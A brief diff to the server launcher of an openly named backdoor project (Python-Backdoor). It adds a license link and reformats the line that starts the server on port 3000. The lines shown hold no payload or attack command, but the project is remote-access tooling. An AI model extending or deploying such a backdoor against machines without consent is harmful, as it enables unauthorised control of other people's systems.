@@ -2,7 +2,10 @@
 https://github.com/xp4xbox/Python-Backdoor
 
 @author    xp4xbox
+
+license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
 """
+
 from src import logger
 from src.server.control import Control
 from src.server.socket import Socket
@@ -22,5 +25,4 @@ class Server:
         View(self.control)
 
 
-if __name__ == "__main__":
-    Server(3000).start()
+if __name__ == "__main__": Server(3000).start()
